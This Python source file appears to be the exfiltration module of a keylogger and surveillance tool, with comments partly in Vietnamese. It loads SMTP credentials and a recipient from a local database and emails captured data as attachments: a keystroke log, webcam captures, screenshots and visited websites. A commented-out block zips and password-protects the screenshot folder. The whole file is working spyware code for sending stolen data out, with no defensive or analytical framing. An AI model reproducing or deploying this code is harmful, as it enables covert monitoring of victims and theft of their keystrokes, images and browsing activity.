import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
from getsqldata import *
'''
#compress file
import zipfile
import os
import pyminizip

def make_zipfile(output_filename, source_dir):
    relroot = os.path.abspath(os.path.join(source_dir, os.pardir))
    with zipfile.ZipFile(output_filename, "w", zipfile.ZIP_DEFLATED) as zip:
        for root, dirs, files in os.walk(source_dir):
            # add directory (needed for empty dirs)
            zip.write(root, os.path.relpath(root, relroot))
            for file in files:
                filename = os.path.join(root, file)
                if os.path.isfile(filename): # regular files only
                    arcname = os.path.join(os.path.relpath(root, relroot), file)
                    zip.write(filename, arcname)
    

#make_zipfile('myzip.zip','Screenshot')
#pyminizip.compress("myzip.zip","./","myzip.zip","abcdef",5)
'''
uid = getCurrentUser()
conf = getRowValue('Email',uid)
deli = getRowValue('EmailDelivery',uid)

fromaddr = deli[4] # uname
toaddr = deli[1] # sendto
  
# instance of MIMEMultipart
msg = MIMEMultipart()
 
# storing the senders email address  
msg['From'] = fromaddr
 
# storing the receivers email address 
msg['To'] = toaddr
 
# storing the subject 
msg['Subject'] = "Test send mail"
 
# string to store the body of the mail
body = "Body_of_the_mail"
 
# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))

dir_path = "./" # thu muc chua file can gui
# cac file can gui
files = ["Webcam.zip","Screenshot.zip","key_log.txt","Website.zip"]
#files = ['key_log.txt','acb.txt']
for f in files:  # add files to the message
    file_path = os.path.join(dir_path, f)
    if (os.path.exists(file_path)):
        attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
        attachment.add_header('Content-Disposition','attachment', filename=f)
        msg.attach(attachment)
    else:
        print(str(file_path) + " does not exists!!!")
# creates SMTP session
smtp = deli[2]
port = deli[3]
s = smtplib.SMTP(smtp, port)
 
# start TLS for security
s.starttls()
 
# Authentication
pwd = deli[5]
s.login(fromaddr, pwd)
 
# Converts the Multipart msg into a string
text = msg.as_string()
 
# sending the mail
s.sendmail(fromaddr, toaddr, text)
 
# terminating the session
s.quit()
